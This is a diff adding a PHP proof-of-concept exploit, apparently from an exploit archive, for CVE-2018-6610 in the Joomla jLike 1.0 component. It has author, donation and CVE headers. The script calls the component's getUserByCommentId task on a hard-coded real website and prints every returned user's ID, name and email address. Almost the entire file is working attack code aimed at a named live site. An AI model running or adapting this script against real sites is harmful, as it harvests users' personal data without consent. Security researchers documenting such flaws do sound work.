@@ -1,0 +1,40 @@
+<?php
+# # # # # 
+# Exploit Title: Joomla! Component jLike 1.0 - Information Leakage
+# Dork: N/A
+# Date: 04.02.2018
+# Vendor Homepage: http://joomlaserviceprovider.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/social-web/social-share/jlike/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6610
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# Want To Donate ? 
+# BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ
+# ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2
+# # # # #
+# Description:
+# Information Leakage
+# 
+# Proof of Concept: 
+# 
+# 1)
+header ('Content-type: text/html; charset=UTF-8');
+$url= "http://www.projectcontrolsinstitute.com/";
+$p="index.php?option=com_jlike&task=getUserByCommentId&tmpl=component&format=row";
+$url = file_get_contents($url.$p);
+$l = json_decode($url, true);
+if($l){
+	echo "*-----------------------------*<br />";
+foreach($l as $u){
+	echo "[-] ID\n\n\n\n:\n" .$u['id']."<br />";
+	echo "[-] Name\n\n:\n" .$u['name']."<br />";
+	echo "[-] Email\n:\n" .$u['email']."<br />";
+	echo "<br>";
+}echo "*-----------------------------*";} 
+else{echo "[-] No user";}
+?>
